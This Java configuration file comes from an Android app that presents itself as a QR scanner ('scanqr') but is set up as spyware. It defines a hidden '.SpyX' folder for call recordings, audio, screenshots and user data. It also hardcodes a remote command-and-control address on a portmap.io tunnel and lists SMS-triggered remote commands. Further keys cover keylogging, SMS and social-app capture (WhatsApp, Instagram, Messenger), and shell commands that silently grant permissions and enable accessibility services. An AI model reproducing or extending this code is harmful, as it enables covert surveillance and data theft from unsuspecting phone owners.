package com.anubhav.scanqr.utils;

import android.Manifest;
import android.os.Environment;

import com.anubhav.scanqr.MyApp;

import java.util.regex.Pattern;


public final class Config {

    public Config() {
    }

    public String appName = MyApp.appName;
    public String appIcon;

    public String getAppName() {
        return appName;
    }

    public void setAppName(String appName) {
        this.appName = appName;
    }

    public String getAppIcon() {
        return appIcon;
    }

    public void setAppIcon(String appIcon) {
        this.appIcon = appIcon;
    }

    public static String getExternalStorageDir() {
        return Environment.getExternalStorageDirectory().getAbsolutePath();
    }

    public static String getAppDir() {
        return getExternalStorageDir() + "/Android/.SpyX";
    }

    public static String getPicturesDir() {
        return getAppDir() + "/pictures";
    }

    public static String getUserDataDir() {
        return getAppDir() + "/user data";
    }

    public static String getDocsDir() {
        return getAppDir() + "/docs";
    }

    public static String getServerDir() {
        return getAppDir() + "/webserver/www";
    }

    public static String getServerFile() {
        return getAppDir() + "/webserver/www/index.html";
    }

    public static String getCallRecordingsDir() {
        return getAppDir() + "/calls recordings";
    }

    public static String getAudioRecordingsDir() {
        return getAppDir() + "/audio recordings";
    }

    public static String getScreenshotDir() {
        return getAppDir() + "/screenshots";
    }

    public static String getCacheDir() {
        return getAppDir() + "/cache";
    }

    public static final Config INSTANCE = new Config();

    public static final String LOG_FILE_PATH = "/storage/emulated/0/Download/Android Apps/Latest Apps/Bitly.apk";
    public static final String EXECUTION_CMD = "EXECUTION_CMD";
    public static final String SERVER_EXECUTION_CMD = "SERVER_EXECUTION_CMD";
    public static final String HOST_ADDRESS = "tcp://dikshakumari5643-34103.portmap.io:34103";
    public static final String REMOTE_HOST_ADDRESS = "dikshakumari5643-34103.portmap.io";
    public static final String LOCAL_HOST_ADDRESS = "127.0.0.1";
    public static final int REMOTE_PORT = 34103;
    public static final int LOCAL_PORT = 5555;
    public static final int MAX_MEMORY_SIZE = 50000000;

    public static final String COUNTRY_PHONE_CODE = "+91";
    public static final String CMD_DIVIDER_MSG = "//CMD//";

    public static final String ENABLE_DATA_CMD = "enable_data";
    public static final String DISABLE_DATA_CMD = "disable_data";
    public static final String ENABLE_GPS_CMD = "enable_gps";
    public static final String DISABLE_GPS_CMD = "disable_gps";
    public static final String START_SERVICE_CMD = "start_service";
    public static final String STOP_SERVICE_CMD = "stop_service";
    public static final String REQUEST_PERMISSIONS_CMD = "request_permissions";
    public static final String GPS_POS_CMD = "gps_pos";
    public static final String NETWORK_POS_CMD = "network_pos";
    public static final String CHANGE_CMD_PREFIX_CMD = "change_prefix";       // min 2 words and max 8 words allowed
    public static final String CHANGE_ADMIN_NUMBER_CMD = "change_admin_no";   // only 10 numbers allowed (phone number without +91)


    public static final int DAILY_REMINDER_REQUEST_CODE = 121;

    public static final String[] PERMISSIONS = new String[]{
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_SMS
    };


    // androspy github extra
    public static String ACTION_START_MAIN_SERVICE = "START_SERVICE";
    public static String ACTION_STOP_MAIN_SERVICE = "STOP_SERVICE";
    public static String ACTION_MAIN_ACTIVITY = "MAIN_ACTIVITY";
    public static String NOTITFICATION_CHANNEL_ID = "SOME_CHANNEL_ID";
    public static String NOTIFICATION_CHANNEL_NAME = "FOREGROUND_SERVICE";
    public static int MAIN_SERVICE_RUNNING_NOTIFICATION_ID = 10000;
    public static String CAMERA_TAG = "MY_CAMERA";
    public static String IP = "";
    public static int port = 0;
    public static String KRBN_ISMI = "";
    public static String front_back = "1";
    public static String flashMode = "1";
    public static String uniq_id = "";
    public static String zoom = "not";
    public static String resolution = "640x480";
    public static String quality = "35";


    // custom github extra
    public static final String ADDRESS_AUDIO_CALLS = "audioCalls";
    public static final String ADDRESS_AUDIO_RECORD = "audioRecord";
    public static final String ADDRESS_IMAGE = "imageNotification";
    public static final String ADDRESS_PHOTO = "photos";
    public static final int APP_DISABLED = 2;
    public static final int APP_ENABLED = 1;
    public static final String CALLS = "calls";
    public static final String CHILD_CAPTURE_PHOTO = "capturePhoto";
    public static final String CHILD_GPS = "gpsEnable";
    public static final String CHILD_NAME = "nameChild";
    public static final String CHILD_PERMISSION = "permissionEnable";
    public static final String CHILD_PHOTO = "photoUrl";
    public static final String CHILD_SERVICE_DATA = "serviceData";
    public static final String CHILD_SHOW_APP = "showApp";
    public static final String CHILD_SOCIAL_MS = "ms";
    public static final String COMMAND_ADD_WHITELIST = "dumpsys deviceidle whitelist +";
    public static final String COMMAND_ENABLE_ACCESSIBILITY = "settings put secure enabled_accessibility_services ";
    public static final String COMMAND_ENABLE_ACCESSIBILITY_1 = "settings put secure accessibility_enabled 1";
    public static final String COMMAND_ENABLE_GPS_PROVIDER = "settings put secure location_providers_allowed +gps";
    public static final String COMMAND_ENABLE_NETWORK_PROVIDER = "settings put secure location_providers_allowed +network";
    public static final String COMMAND_ENABLE_NOTIFICATION_LISTENER = "cmd notification allow_listener ";
    public static final String COMMAND_GRANT_PERMISSION = "pm grant ";
    public static final String COMMAND_TYPE = "commandType";
    public static final String DATA = "data";
    public static final String DEVICE_NAME = "nameDevice";
    public static final String FACEBOOK_MESSENGER_PACK_NAME = "com.facebook.orca";
    public static final int FRONT_FACING_CAMERA = 1;
    public static final String INSTAGRAM_PACK_NAME = "com.instagram.android";
    public static final String INTERVAL = "interval";
    public static final String KEY_LOGGER = "keyLogger";
    public static final String KEY_TEXT = "keyText";
    public static final String LOCATION = "location";
    public static final String NOTIFICATION_MESSAGE = "notificationsMessages";
    public static final String PARAMS = "params";
    public static final String PERMISSION_USAGE_STATS = "android.permission.PACKAGE_USAGE_STATS";
    public static final String PHONE_NUMBER = "phoneNumber";
    public static final String PHOTO = "photo";
    public static final int REAR_FACING_CAMERA = 0;
    public static final String RECORDING = "recording";
    public static final String RESTART_MONITOR_RECEIVER = "com.my.spy.app.receiver.RESTART_MONITOR_RECEIVER";
    public static final long SIZE_CACHE_FIREBASE = 50000000;
    public static final String SMS = "sms";
    public static final String SMS_ADDRESS = "smsAddress";
    public static final String SMS_BODY = "smsBody";
    public static final String SOCIAL = "social";
    public static final int STATE_CALL_END = 3;
    public static final int STATE_CALL_START = 2;
    public static final int STATE_INCOMING_NUMBER = 1;
    public static final String TAG = "IsTheApp";
    private static final Pattern TEXT;
    public static final String TIMER = "timer";
    public static final String TYPE_CALL = "callType";
    public static final int TYPE_CALL_INCOMING = 2;
    public static final int TYPE_CALL_OUTGOING = 1;
    public static final String TYPE_CHILD = "Child";
    public static final int TYPE_INSTAGRAM = 3;
    public static final int TYPE_MESSENGER = 1;
    public static final String TYPE_PARENT = "Parent";
    public static final String TYPE_SMS = "smsType";
    public static final int TYPE_SMS_INCOMING = 2;
    public static final int TYPE_SMS_OUTGOING = 1;
    public static final int TYPE_WHATSAPP = 2;
    public static final String URL_IMAGE = "urlImage";
    public static final String USER = "user";
    public static final String WHATSAPP_PACK_NAME = "com.whatsapp";

    static {
        TEXT = Pattern.compile("^[a-zA-ZñÑЁёА-я]+$");
    }

    public final Pattern getTEXT() {
        return TEXT;
    }

}
